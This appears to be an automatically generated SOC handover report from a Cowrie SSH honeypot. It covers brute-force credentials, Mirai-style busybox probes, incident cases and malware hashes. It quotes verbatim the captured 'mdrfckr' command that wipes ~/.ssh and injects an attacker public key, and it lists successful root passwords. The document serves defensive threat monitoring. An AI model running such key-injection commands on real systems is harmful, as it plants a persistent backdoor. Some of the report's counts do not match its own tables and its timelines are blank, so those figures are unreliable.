# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-01 |
| **Generated At** | 2026-04-01T09:02:19Z |
| **Shift Time** | 09:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **47** |
| Confirmed Threats | **39** |
| False Positives Filtered | **8** (17.0%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **18** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **36** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **44** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **24** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 4 |
| `enable` | 2 |
| `shell` | 2 |
| `linuxshell` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `system` | 2 |
| `sh` | 2 |
| `ping ;sh` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `enable` | `system` | 2 |
| `shell` | `sh` | 2 |
| `linuxshell` | `ping ;sh` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `uFwfBht5` | `223.204.222.188` | 2026-04-01T07:32:50 |
| `root` | `GM8182` | `79.164.253.73` | 2026-04-01T08:16:59 |
| `root` | `zK123456` | `175.198.28.246` | 2026-04-01T08:41:05 |
| `root` | `3245gs5662d34` | `175.198.28.246` | 2026-04-01T08:41:08 |
| `root` | `huanmu123456789` | `103.63.25.203` | 2026-04-01T08:43:28 |
| `root` | `3245gs5662d34` | `103.63.25.203` | 2026-04-01T08:43:32 |
| `root` | `!@#123QWEqwe` | `103.63.25.203` | 2026-04-01T08:47:58 |
| `root` | `henbingidc` | `103.63.25.203` | 2026-04-01T08:52:34 |
| `root` | `1234` | `172.210.53.227` | 2026-04-01T08:54:05 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **47** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 19 |
| libssh | 15 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 19 | 19 |
| `03a80b21afa8...` | Modern SSH client | 15 | 3 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 19 | 19 | Mirai/variant |
| `03a80b21afa8...` | libssh | 15 | 3 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1592, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox GRNFF
```
Source IPs: `79.164.253.73`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
linuxshell
```
Source IPs: `223.204.222.188`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `175.198.28.246`, `103.63.25.203`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **26** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS8048` | CANTV Servicios, Venezuela | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | MEDIUM |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |
| `AS4821` | PT Sinergi Semesta Telematika | 1 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS3215` | Orange S.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4b6ff1ada4f2

| Field | Detail |
|---|---|
| **Source IP** | `79.164.253[.]73` |
| **First Seen** | 2026-04-01 08:16 |
| **Last Seen** | 2026-04-01 08:18 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox GRNFF` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:16:59` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:00` | `?` |
| `2026-04-01 08:17:15` | `?` |
| `2026-04-01 08:18:40` | `?` |
| `2026-04-01 08:18:40` | `?` |

**Recommended Actions:**
- [ ] Submit `79.164.253[.]73` to AbuseIPDB if not already reported
- [ ] Block `79.164.253[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a6bf8858e2

| Field | Detail |
|---|---|
| **Source IP** | `175.198.28[.]246` |
| **First Seen** | 2026-04-01 08:41 |
| **Last Seen** | 2026-04-01 08:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:41:04` | `?` |
| `2026-04-01 08:41:04` | `?` |
| `2026-04-01 08:41:04` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:05` | `?` |
| `2026-04-01 08:41:06` | `?` |
| `2026-04-01 08:41:06` | `?` |
| `2026-04-01 08:41:08` | `?` |

**Recommended Actions:**
- [ ] Submit `175.198.28[.]246` to AbuseIPDB if not already reported
- [ ] Block `175.198.28[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eddfc1fe653

| Field | Detail |
|---|---|
| **Source IP** | `175.198.28[.]246` |
| **First Seen** | 2026-04-01 08:41 |
| **Last Seen** | 2026-04-01 08:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:41:08` | `?` |
| `2026-04-01 08:41:08` | `?` |
| `2026-04-01 08:41:08` | `?` |
| `2026-04-01 08:41:08` | `?` |
| `2026-04-01 08:41:08` | `?` |

**Recommended Actions:**
- [ ] Submit `175.198.28[.]246` to AbuseIPDB if not already reported
- [ ] Block `175.198.28[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c934e43c37d3

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 08:43 |
| **Last Seen** | 2026-04-01 08:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:43:27` | `?` |
| `2026-04-01 08:43:27` | `?` |
| `2026-04-01 08:43:27` | `?` |
| `2026-04-01 08:43:28` | `?` |
| `2026-04-01 08:43:28` | `?` |
| `2026-04-01 08:43:28` | `?` |
| `2026-04-01 08:43:28` | `?` |
| `2026-04-01 08:43:29` | `?` |
| `2026-04-01 08:43:29` | `?` |
| `2026-04-01 08:43:29` | `?` |
| `2026-04-01 08:43:29` | `?` |
| `2026-04-01 08:43:29` | `?` |
| `2026-04-01 08:43:32` | `?` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d860fa94fb9d

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 08:43 |
| **Last Seen** | 2026-04-01 08:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:43:31` | `?` |
| `2026-04-01 08:43:31` | `?` |
| `2026-04-01 08:43:32` | `?` |
| `2026-04-01 08:43:32` | `?` |
| `2026-04-01 08:43:32` | `?` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4886f2af7be

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 08:47 |
| **Last Seen** | 2026-04-01 08:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:47:57` | `?` |
| `2026-04-01 08:47:57` | `?` |
| `2026-04-01 08:47:58` | `?` |
| `2026-04-01 08:47:58` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:47:59` | `?` |
| `2026-04-01 08:48:03` | `?` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23bf25f68882

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 08:48 |
| **Last Seen** | 2026-04-01 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:48:02` | `?` |
| `2026-04-01 08:48:02` | `?` |
| `2026-04-01 08:48:02` | `?` |
| `2026-04-01 08:48:03` | `?` |
| `2026-04-01 08:48:03` | `?` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b911f1f8942

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 08:52 |
| **Last Seen** | 2026-04-01 08:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:52:33` | `?` |
| `2026-04-01 08:52:33` | `?` |
| `2026-04-01 08:52:34` | `?` |
| `2026-04-01 08:52:34` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:35` | `?` |
| `2026-04-01 08:52:39` | `?` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3e45f031ec

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 08:52 |
| **Last Seen** | 2026-04-01 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:52:38` | `?` |
| `2026-04-01 08:52:38` | `?` |
| `2026-04-01 08:52:38` | `?` |
| `2026-04-01 08:52:39` | `?` |
| `2026-04-01 08:52:39` | `?` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f887a807850

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 08:54 |
| **Last Seen** | 2026-04-01 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `pwd` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 08:54:04` | `?` |
| `2026-04-01 08:54:04` | `?` |
| `2026-04-01 08:54:05` | `?` |
| `2026-04-01 08:54:05` | `?` |
| `2026-04-01 08:54:06` | `?` |
| `2026-04-01 08:54:06` | `?` |
| `2026-04-01 08:54:06` | `?` |
| `2026-04-01 08:54:06` | `?` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.63.25[.]203` | **5** | 2026-04-01 08:37 | 2026-04-01 08:57 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `13.86.115[.]97` | **2** | 2026-04-01 08:01 | 2026-04-01 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.39[.]214` | 1 | 2026-04-01 07:29 | 2026-04-01 07:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.120.49[.]14` | 1 | 2026-04-01 07:58 | 2026-04-01 07:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.94.5[.]43` | 1 | 2026-04-01 08:18 | 2026-04-01 08:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.99.127[.]122` | 1 | 2026-04-01 07:50 | 2026-04-01 07:50 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.36.178[.]14` | 1 | 2026-04-01 08:09 | 2026-04-01 08:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.239.129[.]2` | 1 | 2026-04-01 08:57 | 2026-04-01 08:57 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.198.28[.]246` | 1 | 2026-04-01 08:41 | 2026-04-01 08:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.188.253[.]150` | 1 | 2026-04-01 07:48 | 2026-04-01 07:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.92.11[.]80` | 1 | 2026-04-01 08:54 | 2026-04-01 08:54 | 33s | 0 | `T1592` | 🟢 LOW |
| `183.207.186[.]22` | 1 | 2026-04-01 08:41 | 2026-04-01 08:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-04-01 08:46 | 2026-04-01 08:46 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.209.109[.]217` | 1 | 2026-04-01 08:08 | 2026-04-01 08:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.243.207[.]68` | 1 | 2026-04-01 09:01 | 2026-04-01 09:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.169.100[.]15` | 1 | 2026-04-01 08:37 | 2026-04-01 08:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.25.108[.]2` | 1 | 2026-04-01 07:48 | 2026-04-01 07:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.29.104[.]32` | 1 | 2026-04-01 08:28 | 2026-04-01 08:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.161.196[.]5` | 1 | 2026-04-01 08:28 | 2026-04-01 08:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.30.161[.]197` | 1 | 2026-04-01 07:29 | 2026-04-01 07:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]160` | 1 | 2026-04-01 08:47 | 2026-04-01 08:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.186.136[.]36` | 1 | 2026-04-01 08:08 | 2026-04-01 08:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.214.75[.]248` | 1 | 2026-04-01 07:38 | 2026-04-01 07:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.181.74[.]161` | 1 | 2026-04-01 08:47 | 2026-04-01 08:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
